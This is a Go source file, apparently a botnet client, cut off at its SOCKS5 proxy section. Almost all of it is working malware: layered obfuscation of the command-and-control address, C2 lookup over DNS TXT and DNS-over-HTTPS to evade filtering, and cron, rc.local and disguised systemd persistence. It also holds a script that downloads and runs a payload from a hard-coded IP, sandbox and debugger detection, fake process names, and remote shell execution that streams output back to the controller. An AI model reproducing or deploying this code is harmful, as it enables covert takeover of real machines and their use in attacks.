package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
)

//run setup.py dont try to change this yourself

// Debug mode - set to true to see DNS resolution logs
var debugMode = true

// Obfuscated config - multi-layer encoding (setup.py generates this)
const gothTits = "GTRv7pFDanCzINBEitc7sEayeL7DZTU1OsPZ86o=" //change me run setup.py
const cryptSeed = "b60461b7"                                //change me run setup.py

// DNS servers for TXT record lookups (shuffled for load balancing)
var lizardSquad = []string{
	"1.1.1.1:53",        // Cloudflare
	"8.8.8.8:53",        // Google
	"9.9.9.9:53",        // Quad9
	"208.67.222.222:53", // OpenDNS
	"1.0.0.1:53",        // Cloudflare secondary
}

// ============================================================================
// ANTI-ANALYSIS: KEY DERIVATION FUNCTIONS
// These functions split the encryption key across multiple XOR operations
// to make static analysis more difficult. Each returns a single byte.
// ============================================================================

// mew returns the first byte of the derived key (0x31 XOR 0x64 = 0x55)
func mew() byte { return byte(0x31 ^ 0x64) }

// mewtwo returns the second byte of the derived key (0x72 XOR 0x17 = 0x65)
func mewtwo() byte { return byte(0x72 ^ 0x17) }

// celebi returns the third byte of the derived key (0x93 XOR 0xC6 = 0x55)
func celebi() byte { return byte(0x93 ^ 0xc6) }

// jirachi returns the fourth byte of the derived key (0xA4 XOR 0x81 = 0x25)
func jirachi() byte { return byte(0xa4 ^ 0x81) }

// ============================================================================
// CRYPTOGRAPHIC FUNCTIONS
// ============================================================================

// charizard derives a 16-byte encryption key from the seed string.
// It combines: seed + split key bytes + entropy bytes through MD5 hashing.
// The entropy is XOR'd with position-based values for additional obfuscation.
// Returns: 16-byte MD5 hash used as encryption key
func charizard(seed string) []byte {
	h := md5.New()
	h.Write([]byte(seed))
	h.Write([]byte{mew(), mewtwo(), celebi(), jirachi()})
	entropy := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE}
	for i := range entropy {
		entropy[i] ^= byte(len(seed) + i*17)
	}
	h.Write(entropy)
	return h.Sum(nil)
}

// blastoise implements an RC4-like stream cipher for encryption/decryption.
// RC4 is symmetric, so the same function encrypts and decrypts.
// Process: Initialize S-box -> Key scheduling -> Generate keystream -> XOR data
// Parameters:
//   - data: bytes to encrypt/decrypt
//   - key: encryption key (derived from charizard)
//
// Returns: encrypted/decrypted bytes
func blastoise(data []byte, key []byte) []byte {
	s := make([]byte, 256)
	for i := range s {
		s[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(s[i]) + int(key[i%len(key)])) % 256
		s[i], s[j] = s[j], s[i]
	}
	result := make([]byte, len(data))
	i, j := 0, 0
	for k := range data {
		i = (i + 1) % 256
		j = (j + int(s[i])) % 256
		s[i], s[j] = s[j], s[i]
		result[k] = data[k] ^ s[(int(s[i])+int(s[j]))%256]
	}
	return result
}

// venusaur decodes the multi-layer obfuscated C2 address.
// Decoding layers (reverse order of encoding):
//
//	Layer 1: Base64 decode
//	Layer 2: XOR with rotating key
//	Layer 3: RC4 stream cipher decrypt
//	Layer 4: Reverse byte substitution (rotate right 3, XOR 0xAA)
//	Final: Verify MD5 checksum of payload
//
// Parameters:
//   - encoded: Base64 encoded obfuscated string from gothTits constant
//
// Returns: Decoded C2 address (e.g., "192.168.1.1:443") or empty string on error
func venusaur(encoded string) string {
	layer1, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return ""
	}
	key := charizard(cryptSeed)
	layer2 := make([]byte, len(layer1))
	for i := range layer1 {
		layer2[i] = layer1[i] ^ key[i%len(key)]
	}
	layer3 := blastoise(layer2, key)
	result := make([]byte, len(layer3))
	for i := range layer3 {
		b := layer3[i]
		b = ((b << 3) | (b >> 5))
		b ^= 0xAA
		result[i] = b
	}
	if len(result) < 5 {
		return ""
	}
	payload := result[:len(result)-4]
	checksum := result[len(result)-4:]
	h := md5.New()
	h.Write(payload)
	expected := h.Sum(nil)[:4]
	for i := range checksum {
		if checksum[i] != expected[i] {
			return ""
		}
	}
	return string(payload)
}

// ============================================================================
// LOGGING & DEBUG FUNCTIONS
// ============================================================================

// deoxys prints debug messages when debugMode is enabled.
// Useful for troubleshooting C2 connection issues during development.
// Parameters:
//   - format: Printf-style format string
//   - args: Format arguments
func deoxys(format string, args ...interface{}) {
	if debugMode {
		fmt.Printf("[DEBUG] "+format+"\n", args...)
	}
}

// ============================================================================
// DNS RESOLUTION FUNCTIONS
// These functions implement multi-method C2 address resolution for resilience.
// Resolution order: DoH TXT -> TXT record -> A record -> Direct IP
// ============================================================================

// darkrai performs DNS TXT record lookup to retrieve C2 address.
// Queries multiple DNS servers (Cloudflare, Google, Quad9, OpenDNS) for redundancy.
// Supports TXT record formats: "c2=IP:PORT", "ip=IP:PORT", raw "IP:PORT", plain IP
// Parameters:
//   - domain: Domain to query for TXT records
//
// Returns: C2 address string (IP:PORT) or error
func darkrai(domain string) (string, error) {
	deoxys("darkrai: Looking up TXT for domain: %s", domain)
	servers := make([]string, len(lizardSquad))
	copy(servers, lizardSquad)
	rand.Shuffle(len(servers), func(i, j int) {
		servers[i], servers[j] = servers[j], servers[i]
	})
	var lastErr error
	for _, server := range servers {
		deoxys("darkrai: Trying DNS server: %s", server)
		c := new(dns.Client)
		c.Timeout = 5 * time.Second
		c.Net = "udp"
		m := new(dns.Msg)
		m.SetQuestion(dns.Fqdn(domain), dns.TypeTXT)
		m.RecursionDesired = true
		r, rtt, err := c.Exchange(m, server)
		if err != nil {
			deoxys("darkrai: DNS error from %s: %v", server, err)
			lastErr = err
			continue
		}
		deoxys("darkrai: Got response from %s in %v, rcode=%d, answers=%d", server, rtt, r.Rcode, len(r.Answer))
		if r.Rcode != dns.RcodeSuccess {
			lastErr = fmt.Errorf("DNS query failed with code: %d", r.Rcode)
			deoxys("darkrai: Bad rcode: %d", r.Rcode)
			continue
		}
		for _, ans := range r.Answer {
			deoxys("darkrai: Answer type: %T, value: %v", ans, ans)
			if txt, ok := ans.(*dns.TXT); ok {
				deoxys("darkrai: TXT record found with %d strings", len(txt.Txt))
				for _, t := range txt.Txt {
					deoxys("darkrai: TXT value: '%s'", t)
					t = strings.TrimSpace(t)
					if strings.HasPrefix(t, "c2=") {
						result := strings.TrimPrefix(t, "c2=")
						deoxys("darkrai: Found c2= prefix, returning: %s", result)
						return result, nil
					}
					if strings.HasPrefix(t, "ip=") {
						result := strings.TrimPrefix(t, "ip=")
						deoxys("darkrai: Found ip= prefix, returning: %s", result)
						return result, nil
					}
					// Try raw IP:port format
					if strings.Contains(t, ":") && !strings.Contains(t, " ") {
						parts := strings.Split(t, ":")
						if len(parts) == 2 {
							if net.ParseIP(parts[0]) != nil || arceus(parts[0]) {
								deoxys("darkrai: Found raw IP:port, returning: %s", t)
								return t, nil
							}
						}
					}
					// Try plain IP address (no port) - append default 443
					if net.ParseIP(t) != nil {
						result := t + ":443"
						deoxys("darkrai: Found plain IP, appending :443, returning: %s", result)
						return result, nil
					}
				}
			}
		}
		lastErr = fmt.Errorf("no valid C2 address in TXT records")
		deoxys("darkrai: No valid C2 found in TXT records from %s", server)
	}
	deoxys("darkrai: All servers failed, last error: %v", lastErr)
	return "", lastErr
}

// palkia performs DNS-over-HTTPS (DoH) TXT record lookup.
// DoH encrypts DNS queries, bypassing local DNS filtering/monitoring.
// Tries Cloudflare, Google, and Quad9 DoH servers in sequence.
// Parameters:
//   - domain: Domain to query for TXT records via DoH
//
// Returns: C2 address string (IP:PORT) or error
func palkia(domain string) (string, error) {
	deoxys("palkia: Starting DoH TXT lookup for: %s", domain)
	dohServers := []string{
		"https://cloudflare-dns.com/dns-query",
		"https://dns.google/dns-query",
		"https://dns.quad9.net/dns-query",
	}
	for _, server := range dohServers {
		dohURL := fmt.Sprintf("%s?name=%s&type=TXT", server, domain)
		deoxys("palkia: Trying DoH server: %s", dohURL)
		req, err := http.NewRequest("GET", dohURL, nil)
		if err != nil {
			deoxys("palkia: Request create error: %v", err)
			continue
		}
		req.Header.Set("Accept", "application/dns-json")
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			deoxys("palkia: Request error: %v", err)
			continue
		}
		deoxys("palkia: Got response status: %d", resp.StatusCode)
		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			continue
		}
		var dnsResp struct {
			Status int `json:"Status"`
			Answer []struct {
				Type int    `json:"type"`
				Data string `json:"data"`
			} `json:"Answer"`
		}
		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
			deoxys("palkia: JSON decode error: %v", err)
			resp.Body.Close()
			continue
		}
		resp.Body.Close()
		deoxys("palkia: DNS status=%d, answers=%d", dnsResp.Status, len(dnsResp.Answer))
		for _, ans := range dnsResp.Answer {
			deoxys("palkia: Answer type=%d data='%s'", ans.Type, ans.Data)
			// TXT records are type 16
			if ans.Type != 16 {
				continue
			}
			data := strings.Trim(ans.Data, "\"")
			data = strings.TrimSpace(data)
			deoxys("palkia: Parsed TXT data: '%s'", data)
			if strings.HasPrefix(data, "c2=") {
				result := strings.TrimPrefix(data, "c2=")
				deoxys("palkia: Found c2=, returning: %s", result)
				return result, nil
			}
			if strings.HasPrefix(data, "ip=") {
				result := strings.TrimPrefix(data, "ip=")
				deoxys("palkia: Found ip=, returning: %s", result)
				return result, nil
			}
			if strings.Contains(data, ":") && !strings.Contains(data, " ") {
				parts := strings.Split(data, ":")
				if len(parts) == 2 {
					deoxys("palkia: Found raw IP:port, returning: %s", data)
					return data, nil
				}
			}
			// Try plain IP address (no port) - append default 443
			if net.ParseIP(data) != nil {
				result := data + ":443"
				deoxys("palkia: Found plain IP, appending :443, returning: %s", result)
				return result, nil
			}
		}
	}
	deoxys("palkia: All DoH servers failed")
	return "", fmt.Errorf("DoH TXT lookup failed")
}

// rayquaza performs DNS A record lookup as a fallback method.
// First tries system resolver, then falls back to DoH A record queries.
// Used when TXT record lookups fail (domain points directly to C2 server).
// Parameters:
//   - domain: Domain to resolve to IP address
//
// Returns: IP address string or error
func rayquaza(domain string) (string, error) {
	deoxys("rayquaza: A record fallback for: %s", domain)
	// Try system resolver first
	ips, err := net.LookupHost(domain)
	if err == nil && len(ips) > 0 {
		deoxys("rayquaza: System resolver returned: %s", ips[0])
		return ips[0], nil
	}
	deoxys("rayquaza: System resolver failed: %v, trying DoH", err)

	// Fallback to DoH A record
	dohServers := []string{
		"https://cloudflare-dns.com/dns-query",
		"https://dns.google/dns-query",
	}
	for _, server := range dohServers {
		dohURL := fmt.Sprintf("%s?name=%s&type=A", server, domain)
		deoxys("rayquaza: Trying DoH A record: %s", dohURL)
		req, err := http.NewRequest("GET", dohURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Accept", "application/dns-json")
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			deoxys("rayquaza: DoH error: %v", err)
			continue
		}
		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			continue
		}
		var dnsResp struct {
			Answer []struct {
				Type int    `json:"type"`
				Data string `json:"data"`
			} `json:"Answer"`
		}
		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
			resp.Body.Close()
			continue
		}
		resp.Body.Close()
		for _, ans := range dnsResp.Answer {
			// A records are type 1
			if ans.Type == 1 {
				deoxys("rayquaza: Found A record: %s", ans.Data)
				return ans.Data, nil
			}
		}
	}
	return "", fmt.Errorf("A record lookup failed")
}

// arceus validates a hostname string according to RFC 1123 rules.
// Checks: length (1-253 chars), valid characters (alphanumeric, hyphen, dot).
// Parameters:
//   - h: Hostname string to validate
//
// Returns: true if valid hostname, false otherwise
func arceus(h string) bool {
	if len(h) == 0 || len(h) > 253 {
		return false
	}
	for _, c := range h {
		if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
			(c >= '0' && c <= '9') || c == '-' || c == '.') {
			return false
		}
	}
	return true
}

// dialga is the main C2 address resolver that orchestrates all resolution methods.
// Resolution priority:
//  1. Check if config is already IP:PORT format (direct connection)
//  2. DNS TXT record lookup via DoH (palkia) - encrypted, harder to detect
//  3. DNS TXT record lookup via UDP (darkrai) - fallback if DoH blocked
//  4. DNS A record fallback (rayquaza)
//  5. Return raw decoded value as last resort
//
// Returns: C2 address in "IP:PORT" format, or empty string on total failure
func dialga() string {
	deoxys("dialga: Starting C2 resolution")
	decoded := venusaur(gothTits)
	deoxys("dialga: Decoded config: '%s'", decoded)
	if decoded == "" {
		deoxys("dialga: Failed to decode config, returning empty")
		return ""
	}
	// Check if already IP:port format
	if strings.Contains(decoded, ":") {
		parts := strings.Split(decoded, ":")
		if len(parts) == 2 && net.ParseIP(parts[0]) != nil {
			deoxys("dialga: Config is already IP:port format: %s", decoded)
			return decoded
		}
	}
	// Extract domain and port
	domain := decoded
	defaultPort := "443"
	if strings.Contains(domain, ":") {
		parts := strings.Split(domain, ":")
		domain = parts[0]
		if len(parts) > 1 {
			defaultPort = parts[1]
		}
	}
	deoxys("dialga: Domain=%s, Port=%s", domain, defaultPort)

	// Method 1: DoH TXT record lookup (encrypted, harder to detect/block)
	deoxys("dialga: Trying TXT record lookup via DoH")
	if c2Addr, err := palkia(domain); err == nil && c2Addr != "" {
		deoxys("dialga: DoH TXT lookup success: %s", c2Addr)
		return c2Addr
	}

	// Method 2: DNS TXT record lookup (fallback if DoH blocked)
	deoxys("dialga: Trying TXT record lookup via UDP DNS")
	if c2Addr, err := darkrai(domain); err == nil && c2Addr != "" {
		deoxys("dialga: TXT lookup success: %s", c2Addr)
		return c2Addr
	}

	// Method 3: Fallback to A record (domain points directly to C2)
	deoxys("dialga: TXT lookups failed, falling back to A record")
	if ip, err := rayquaza(domain); err == nil && ip != "" {
		result := fmt.Sprintf("%s:%s", ip, defaultPort)
		deoxys("dialga: A record fallback success: %s", result)
		return result
	}

	// Last resort: return decoded value as-is
	deoxys("dialga: All resolution methods failed, returning decoded: %s", decoded)
	return decoded
}

const (
	magicCode       = "1a6R7s^W9DAYHc88" //change this per campaign
	protocolVersion = "V1_8"             //change this per campaign
)

var (
	fancyBear        = 5 * time.Second
	cozyBear         = 2024
	lazarusListener  net.Listener
	lazarusActive    bool
	lazarusMutex     sync.Mutex
	lazarusCount     int32
	lazarusMax       int32 = 100
	aptStopChan            = make(chan struct{})
	aptStopMutex     sync.Mutex
	aptAttackRunning bool

	// Proxy support for L7 attacks (pre-validated by CNC)
	proxyList      []string
	proxyListMutex sync.RWMutex
)

// equationGroup defines the buffer size for various operations (256 bytes)
const equationGroup = 256

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

// sandworm appends a line to a file, creating it if it doesn't exist.
// Used for adding persistence entries to system files like /etc/rc.local.
// Parameters:
//   - path: File path to append to
//   - line: Content to append
//   - perm: File permissions if creating new file
//
// Returns: error if file operation fails
func sandworm(path, line string, perm os.FileMode) error {
	deoxys("sandworm: Opening file %s for append", path)
	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, perm)
	if err != nil {
		deoxys("sandworm: Failed to open file: %v", err)
		return err
	}
	defer f.Close()
	n, err := f.WriteString(line)
	if err != nil {
		deoxys("sandworm: Failed to write: %v", err)
		return err
	}
	deoxys("sandworm: Wrote %d bytes to %s", n, path)
	return nil
}

// turla generates a random alphanumeric string of specified length.
// Used for generating random filenames, process names, and request data.
// Parameters:
//   - n: Length of random string to generate
//
// Returns: Random string containing a-z and 0-9 characters
func turla(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// kimsuky generates a random process name that looks like a legitimate system process.
// Combines common daemon names with random suffix to avoid detection.
// Returns: String like "syncd-a7x2" or "crond-9k1m"
func kimsuky() string {
	dict := []string{"update", "syncd", "logger", "system", "crond", "netd"}
	return dict[rand.Intn(len(dict))] + "-" + turla(4)
}

// ============================================================================
// PERSISTENCE FUNCTIONS
// These establish various methods to survive reboots and maintain access.
// ============================================================================

// carbanak creates a cron job that runs every minute to check/restart the bot.
// The cron job executes a hidden shell script that ensures persistence.
// Parameters:
//   - hiddenDir: Directory containing the persistence script
func carbanak(hiddenDir string) {
	deoxys("carbanak: Setting up cron persistence in %s", hiddenDir)
	cronJob := fmt.Sprintf("* * * * * bash %s/.redis_script.sh > /dev/null 2>&1", hiddenDir)
	deoxys("carbanak: Cron job: %s", cronJob)
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
	err := cmd.Run()
	if err != nil {
		deoxys("carbanak: Failed to install cron job: %v", err)
	} else {
		deoxys("carbanak: Cron job installed successfully")
	}
}

// lazarus sets up a simple cron job to keep the bot running.
// Runs every minute to check if bot is alive and restart if needed.
// Does not require any external scripts - directly executes the binary.
func lazarus() {
	deoxys("lazarus: Setting up cron persistence for bot executable")
	exe, err := os.Executable()
	if err != nil {
		deoxys("lazarus: Failed to get executable path: %v", err)
		return
	}
	deoxys("lazarus: Executable path: %s", exe)

	// Get process name for pgrep
	procName := filepath.Base(exe)
	deoxys("lazarus: Process name: %s", procName)

	// Create cron job that checks if process is running and starts it if not
	cronJob := fmt.Sprintf("* * * * * pgrep -x %s > /dev/null || %s > /dev/null 2>&1 &", procName, exe)
	deoxys("lazarus: Cron job: %s", cronJob)

	// Check if cron job already exists
	checkCmd := exec.Command("crontab", "-l")
	existing, _ := checkCmd.Output()
	if strings.Contains(string(existing), exe) {
		deoxys("lazarus: Cron job already exists, skipping")
		return
	}

	// Add to crontab
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
	err = cmd.Run()
	if err != nil {
		deoxys("lazarus: Failed to install cron job: %v", err)
	} else {
		deoxys("lazarus: Cron job installed successfully")
	}
}

// fin7 adds the bot executable to /etc/rc.local for startup persistence.
// Only adds entry if rc.local exists and doesn't already contain our path.
// Uses a random suffix to make the entry less obvious.
func fin7() {
	deoxys("fin7: Starting rc.local persistence setup")
	rc := "/etc/rc.local"
	if _, err := os.Stat(rc); err != nil {
		deoxys("fin7: %s does not exist, skipping (err: %v)", rc, err)
		return
	}
	deoxys("fin7: %s exists, proceeding", rc)
	exe, err := os.Executable()
	if err != nil {
		deoxys("fin7: Failed to get executable path: %v", err)
		return
	}
	deoxys("fin7: Executable path: %s", exe)
	b, err := os.ReadFile(rc)
	if err != nil {
		deoxys("fin7: Failed to read %s: %v", rc, err)
		return
	}
	if strings.Contains(string(b), exe) {
		deoxys("fin7: Entry already exists in rc.local, skipping")
		return
	}
	line := exe + " # " + kimsuky() + "\n"
	deoxys("fin7: Adding line to rc.local: %s", strings.TrimSpace(line))
	err = sandworm(rc, line, 0700)
	if err != nil {
		deoxys("fin7: Failed to write to rc.local: %v", err)
	} else {
		deoxys("fin7: Successfully added to rc.local")
	}
}

// dragonfly sets up comprehensive persistence using multiple methods:
//  1. Creates hidden directory /var/lib/.redis_helper
//  2. Writes a shell script that downloads/runs the bot
//  3. Creates a systemd service for automatic startup
//  4. Installs a cron job as backup persistence
//
// All files are disguised as Redis-related system files.
func dragonfly() {
	deoxys("dragonfly: Starting comprehensive persistence setup")
	hiddenDir := "/var/lib/.redis_helper"
	scriptPath := filepath.Join(hiddenDir, ".redis_script.sh")
	programPath := filepath.Join(hiddenDir, ".redis_process")
	url := "http://185.247.224.107/mods/installer"

	deoxys("dragonfly: Creating hidden directory: %s", hiddenDir)
	err := os.MkdirAll(hiddenDir, 0755)
	if err != nil {
		deoxys("dragonfly: Failed to create hidden directory: %v", err)
	} else {
		deoxys("dragonfly: Hidden directory created successfully")
	}

	scriptContent := fmt.Sprintf("#!/bin/bash\nURL=\"%s\"\nPROGRAM_PATH=\"%s\"\nif [ ! -f \"$PROGRAM_PATH\" ]; then\nwget -O $PROGRAM_PATH $URL\nchmod +x $PROGRAM_PATH\nfi\nif ! pgrep -x \".redis_process\" > /dev/null; then\n$PROGRAM_PATH &\nfi\n", url, programPath)
	deoxys("dragonfly: Writing persistence script to: %s", scriptPath)
	err = os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	if err != nil {
		deoxys("dragonfly: Failed to write script: %v", err)
	} else {
		deoxys("dragonfly: Script written successfully")
	}

	serviceContent := "[Unit]\nDescription=System Helper Service\nAfter=network.target\n[Service]\nExecStart=/var/lib/.redis_helper/.redis_script.sh\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\n"
	servicePath := "/etc/systemd/system/redis-helper.service"
	deoxys("dragonfly: Writing systemd service to: %s", servicePath)
	err = os.WriteFile(servicePath, []byte(serviceContent), 0644)
	if err != nil {
		deoxys("dragonfly: Failed to write systemd service: %v", err)
	} else {
		deoxys("dragonfly: Systemd service file written successfully")
	}

	deoxys("dragonfly: Enabling systemd service")
	cmd := exec.Command("systemctl", "enable", "--now", "redis-helper.service")
	output, err := cmd.CombinedOutput()
	if err != nil {
		deoxys("dragonfly: Failed to enable systemd service: %v (output: %s)", err, string(output))
	} else {
		deoxys("dragonfly: Systemd service enabled successfully")
	}

	deoxys("dragonfly: Setting up cron backup persistence")
	carbanak(hiddenDir)
	deoxys("dragonfly: Persistence setup complete")
}

// ============================================================================
// ANTI-ANALYSIS & SANDBOX DETECTION
// ============================================================================

// winnti detects if the bot is running in a sandbox or analysis environment.
// Detection methods:
//  1. Check for VM indicators in process cmdlines (vmware, vbox, qemu, etc.)
//  2. Look for running analysis tools (strace, gdb, wireshark, etc.)
//  3. Check if parent process is a debugger
//
// Returns: true if sandbox/analysis detected, false if safe to run
func winnti() bool {
	vmIndicators := []string{"vmware", "vbox", "virtualbox", "qemu", "firejail", "bubblewrap", "gvisor", "kata", "cuckoo", "joesandbox", "cape", "any.run", "hybrid-analysis"}
	if procs, err := os.ReadDir("/proc"); err == nil {
		for _, proc := range procs {
			if !proc.IsDir() {
				continue
			}
			if _, err := strconv.Atoi(proc.Name()); err != nil {
				continue
			}
			if cmdline, err := os.ReadFile("/proc/" + proc.Name() + "/cmdline"); err == nil {
				cmdStr := strings.ToLower(string(cmdline))
				for _, indicator := range vmIndicators {
					if strings.Contains(cmdStr, indicator) {
						return true
					}
				}
			}
		}
	}
	analysisTools := []string{"/usr/bin/strace", "/usr/bin/ltrace", "/usr/bin/gdb", "/usr/bin/radare2", "/usr/bin/ghidra", "/usr/bin/ida", "/usr/bin/wireshark", "/usr/bin/tshark", "/usr/bin/tcpdump"}
	for _, tool := range analysisTools {
		if _, err := os.Stat(tool); err == nil {
			if out, err := exec.Command("pgrep", "-f", filepath.Base(tool)).Output(); err == nil {
				if len(strings.TrimSpace(string(out))) > 0 {
					return true
				}
			}
		}
	}
	if ppid := os.Getppid(); ppid > 1 {
		if cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid)); err == nil {
			parentCmd := strings.ToLower(string(cmdline))
			debuggers := []string{"gdb", "strace", "ltrace", "radare2", "rr"}
			for _, debugger := range debuggers {
				if strings.Contains(parentCmd, debugger) {
					return true
				}
			}
		}
	}
	return false
}

// ============================================================================
// C2 CONNECTION FUNCTIONS
// ============================================================================

// scarcruft parses a C2 address string into host and port components.
// Handles various URL formats by stripping protocol prefixes.
// Parameters:
//   - address: C2 address in various formats (tcp://, http://, https://, or raw)
//
// Returns: host string, port string, or error if format invalid
func scarcruft(address string) (string, string, error) {
	address = strings.TrimSpace(address)
	address = strings.TrimPrefix(address, "tcp://")
	address = strings.TrimPrefix(address, "http://")
	address = strings.TrimPrefix(address, "https://")
	parts := strings.Split(address, ":")
	if len(parts) != 2 {
		return "", "", fmt.Errorf("invalid address")
	}
	return parts[0], parts[1], nil
}

// gamaredon establishes a TLS connection to the C2 server.
// Uses TLS 1.2+ with InsecureSkipVerify (self-signed certs are common for C2).
// Implements proper timeout handling for both TCP dial and TLS handshake.
// Parameters:
//   - host: C2 server hostname or IP
//   - port: C2 server port (typically 443)
//
// Returns: TLS connection or error
func gamaredon(host, port string) (net.Conn, error) {
	deoxys("gamaredon: Attempting TLS connection to %s:%s", host, port)
	tlsConfig := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	dialer := &net.Dialer{Timeout: 30 * time.Second}
	deoxys("gamaredon: Dialing TCP...")
	rawConn, err := dialer.Dial("tcp", net.JoinHostPort(host, port))
	if err != nil {
		deoxys("gamaredon: TCP dial failed: %v", err)
		return nil, err
	}
	deoxys("gamaredon: TCP connected, starting TLS handshake...")
	tlsConn := tls.Client(rawConn, tlsConfig)
	tlsConn.SetDeadline(time.Now().Add(30 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		deoxys("gamaredon: TLS handshake failed: %v", err)
		tlsConn.Close()
		return nil, err
	}
	deoxys("gamaredon: TLS handshake successful, cipher: %s", tls.CipherSuiteName(tlsConn.ConnectionState().CipherSuite))
	tlsConn.SetDeadline(time.Time{})
	return tlsConn, nil
}

// mustangPanda generates a unique 8-character bot identifier.
// Combines hostname and MAC address, then hashes with MD5.
// This ID persists across reboots for consistent bot tracking.
// Returns: 8-character hex string (first 8 chars of MD5 hash)
func mustangPanda() string {
	hostname, _ := os.Hostname()
	interfaces, _ := net.Interfaces()
	mac := "unknown"
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 && len(iface.HardwareAddr) > 0 {
			mac = iface.HardwareAddr.String()
			break
		}
	}
	data := fmt.Sprintf("%s:%s", hostname, mac)
	hash := fmt.Sprintf("%x", md5.Sum([]byte(data)))
	return hash[:8]
}

// hafnium generates an authentication response for the C2 challenge-response protocol.
// Algorithm: Base64(MD5(challenge + secret + challenge))
// Parameters:
//   - challenge: Random challenge string from C2 server
//   - secret: Shared magic code (must match C2 server)
//
// Returns: Base64-encoded authentication response
func hafnium(challenge, secret string) string {
	h := md5.New()
	h.Write([]byte(challenge + secret + challenge))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

// charmingKitten detects and returns a human-readable architecture string.
// Maps Go's runtime.GOARCH values to descriptive names.
// Format: "OS-Architecture" (e.g., "Linux-x64", "Windows-ARM64")
// Returns: Architecture description string
func charmingKitten() string {
	goarch := runtime.GOARCH
	osName := runtime.GOOS
	archMap := map[string]string{"386": "x86", "amd64": "x64", "arm": "ARM32", "arm64": "ARM64", "mips": "MIPS", "mips64": "MIPS64", "ppc64": "PowerPC64", "ppc64le": "PowerPC64LE", "s390x": "s390x", "wasm": "WebAssembly"}
	if arch, exists := archMap[goarch]; exists {
		if osName == "windows" {
			if goarch == "amd64" {
				return "Windows-x64"
			} else if goarch == "386" {
				return "Windows-x86"
			}
		} else if osName == "linux" {
			return "Linux-" + arch
		} else if osName == "darwin" {
			return "macOS-" + arch
		}
		return arch
	}
	return osName + "-" + goarch
}

// revilMem retrieves total system RAM in megabytes using syscall.
// Uses Linux sysinfo syscall to get memory information.
// Returns: Total RAM in MB, or 0 on error
func revilMem() int64 {
	var info syscall.Sysinfo_t
	if err := syscall.Sysinfo(&info); err != nil {
		return 0
	}
	return int64(uint64(info.Totalram) * uint64(info.Unit) / 1024 / 1024)
}

// ============================================================================
// SHELL EXECUTION FUNCTIONS
// ============================================================================

// sidewinder executes a shell command and captures output synchronously.
// Runs command via "sh -c" and captures both stdout and stderr.
// Parameters:
//   - cmd: Shell command string to execute
//
// Returns: Combined stdout/stderr output, and error if command failed
func sidewinder(cmd string) (string, error) {
	args := []string{"sh", "-c", cmd}
	command := exec.Command(args[0], args[1:]...)
	var stdout, stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr
	err := command.Run()
	if err != nil {
		return fmt.Sprintf("Error: %v\nStderr: %s", err, stderr.String()), err
	}
	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\nStderr: " + stderr.String()
	}
	return output, nil
}

// oceanLotus executes a shell command in detached/background mode.
// Uses Setsid to create new session, disconnecting from parent.
// Useful for long-running commands that shouldn't block C2 communication.
// Parameters:
//   - cmd: Shell command string to execute in background
func oceanLotus(cmd string) {
	go func() {
		args := []string{"sh", "-c", cmd}
		command := exec.Command(args[0], args[1:]...)
		command.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
		command.Stdout = nil
		command.Stderr = nil
		command.Stdin = nil
		command.Start()
	}()
}

// machete executes a shell command with real-time output streaming to C2.
// Output is sent line-by-line as it becomes available, prefixed with STDOUT/STDERR.
// Useful for long-running commands where immediate feedback is needed.
// Parameters:
//   - cmd: Shell command string to execute
//   - conn: C2 connection to stream output to
//
// Returns: error if command setup fails
func machete(cmd string, conn net.Conn) error {
	args := []string{"sh", "-c", cmd}
	command := exec.Command(args[0], args[1:]...)
	stdout, err := command.StdoutPipe()
	if err != nil {
		return err
	}
	stderr, err := command.StderrPipe()
	if err != nil {
		return err
	}
	if err := command.Start(); err != nil {
		return err
	}
	go func() {
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			conn.Write([]byte(fmt.Sprintf("STDOUT: %s\n", scanner.Text())))
		}
	}()
	go func() {
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			conn.Write([]byte(fmt.Sprintf("STDERR: %s\n", scanner.Text())))
		}
	}()
	err = command.Wait()
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("EXIT ERROR: %v\n", err)))
	} else {
		conn.Write([]byte("EXIT: Command completed successfully\n"))
	}
	return nil
}

// ============================================================================
// SOCKS5 PROXY FUNCTIONS
